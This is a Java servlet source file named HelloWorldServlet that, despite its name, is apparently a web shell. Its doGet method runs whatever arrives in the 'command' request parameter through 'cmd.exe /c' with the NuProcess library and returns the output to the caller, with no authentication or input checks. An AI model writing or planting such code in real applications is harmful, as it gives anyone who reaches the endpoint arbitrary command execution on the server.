package com.example;

import com.zaxxer.nuprocess.NuAbstractProcessHandler;
import com.zaxxer.nuprocess.NuProcess;
import com.zaxxer.nuprocess.NuProcessBuilder;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

//@WebServlet(urlPatterns = {"/*"}, loadOnStartup = 1)
public class HelloWorldServlet extends HttpServlet {
    @Override
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        response.setContentType("text/html");
        String command = "cmd.exe /c " + request.getParameter("command");
        String[] cmd = command.split(" ");
        System.out.println(command);
        PrintWriter out = response.getWriter();


        try {
            NuProcessBuilder builder = new NuProcessBuilder(Arrays.asList(cmd));

            ProcessHandler handler = new ProcessHandler(response);
            builder.setProcessListener(handler);
            NuProcess process = builder.start();
//            if (cmd.length>1){
//                int index= 1;
//                while (index < cmd.length){
//                    ByteBuffer buffer = ByteBuffer.wrap((" "+cmd[index]).getBytes());
//                    process.writeStdin(buffer);
//                    index ++;
//                }
//
//            }


            process.waitFor(0, TimeUnit.SECONDS);


        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        out.flush();
        out.close();
    }
}


class ProcessHandler extends NuAbstractProcessHandler {
    private NuProcess nuProcess;
    private HttpServletResponse response;

    public ProcessHandler(HttpServletResponse response) {
        this.response = response;

    }

    public void onStart(NuProcess nuProcess) {
        this.nuProcess = nuProcess;

    }


    public void onStdout(ByteBuffer buffer, boolean closed) {
        if (!closed) {
            byte[] bytes = new byte[buffer.remaining()];
            // You must update buffer.position() before returning (either implicitly,
            // like this, or explicitly) to indicate how many bytes your handler has consumed.
            buffer.get(bytes);
            try {
                PrintWriter ou = response.getWriter();
                ou.print(new String(bytes)+"\r\n");

                System.out.println(new String(bytes));

            } catch (IOException e) {
                e.printStackTrace();
            }

            // For this example, we're done, so closing STDIN will cause the "cat" process to exit
            nuProcess.closeStdin(true);


        }
    }


}